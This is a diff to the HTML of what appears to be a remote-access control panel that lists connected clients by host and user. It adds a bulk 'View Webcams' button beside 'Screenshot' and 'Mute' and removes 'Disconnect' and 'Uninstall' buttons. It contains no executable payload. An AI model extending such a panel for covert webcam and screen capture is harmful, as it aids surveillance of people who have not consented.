@@ -152,6 +152,7 @@
           </div>
         </section>
         <div class="dashboard-toolbar">
+          <output id="online-ascii-status" class="online-ascii-status" aria-live="polite">000</output>
           <label
             id="search-shell"
             class="dashboard-search flex items-center gap-2 bg-slate-800/70 border border-slate-700/60 rounded-lg px-3 py-2"
@@ -164,7 +165,6 @@
               placeholder="Search by nickname, host, user, id"
             />
           </label>
-          <output id="online-ascii-status" class="online-ascii-status" aria-live="polite">[ ONLINE: 000 ]</output>
           <div class="dashboard-toolbar-actions">
             <label class="dashboard-toggle" title="Show offline clients">
               <input id="toggle-offline" type="checkbox" checked />
@@ -255,23 +255,8 @@
             >
               <i class="fa-solid fa-camera"></i> Screenshot
             </button>
-            <button
-              id="bulk-disconnect"
-              class="px-3 py-2 rounded-lg bg-slate-800/70 hover:bg-red-950/60 text-red-300 border border-red-900/60 transition-colors"
-            >
-              <i class="fa-solid fa-plug-circle-xmark"></i> Disconnect
-            </button>
-            <button
-              id="bulk-uninstall"
-              class="px-3 py-2 rounded-lg bg-slate-800/70 hover:bg-rose-950/60 text-rose-300 border border-rose-900/60 transition-colors"
-            >
-              <i class="fa-solid fa-trash"></i> Uninstall
-            </button>
-            <button
-              id="bulk-group"
-              class="px-3 py-2 rounded-lg bg-slate-800/70 hover:bg-slate-700/70 text-slate-300 border border-slate-600/60 transition-colors"
-            >
-              <i class="fa-solid fa-layer-group"></i> Set Group
+            <button id="bulk-webcams" class="px-3 py-2 rounded-lg bg-cyan-950/60 hover:bg-cyan-900/60 text-cyan-100 border border-cyan-500/40 transition-colors">
+              <i class="fa-solid fa-video"></i> View Webcams
             </button>
             <button
               id="bulk-mute"
